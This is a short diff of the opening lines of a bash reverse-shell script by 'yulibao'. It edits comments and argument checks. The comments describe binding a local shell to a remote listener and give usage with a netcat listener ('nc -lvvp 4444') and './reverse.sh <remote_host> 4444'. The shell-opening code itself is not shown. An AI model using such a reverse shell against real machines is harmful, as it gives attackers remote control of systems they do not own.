@@ -1,18 +1,19 @@
 #!/bin/bash
-# author: yulibao
-# this script will bind a local shell to a remote listening
+# Author: yulibao
+# Script: Bind a local shell to a remote listening
 
-# remote listening may be like this: 
+# Usage:
+# Start remote listening may be like this: 
 #   nc -lvvp 4444
 # and connect to ir by:
 # ./reverse.sh <remote_host> 4444
 
-if [ ! "$1" ]; then
+if [ ! -n "$1" ]; then
     echo "Error: no target address"
     exit 1
 fi
 
-if [ ! "$2" ]; then
+if [ ! -n "$2" ]; then
     echo "Error: no target port"
     exit 1
 fi
